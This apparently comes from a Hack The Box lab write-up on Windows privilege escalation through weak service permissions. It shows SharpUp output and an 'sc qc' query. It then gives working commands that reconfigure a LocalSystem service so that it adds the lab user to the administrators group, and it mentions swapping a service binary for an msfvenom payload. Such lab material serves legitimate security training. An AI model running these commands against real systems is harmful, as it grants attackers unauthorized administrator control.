Using `SharpUp`, it is possible to determine which services the current user can modify.

```bash
c:\Tools>SharpUp.exe

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Services ===

  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
#### Modifiable Services

Look at the individual services and see which user the service is using when in use:

```bash
c:\Tools>sc qc WindscribeService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : WindscribeService
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Modify the service:

```bash
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

Stop and start the service:
```bash
sc stop WindscribeService
sc start WindscribeService
```
### Modifiable Service Binaries

Use `msfvenom`, replace the `exe` using the same name as the original service. Start and Stop the service.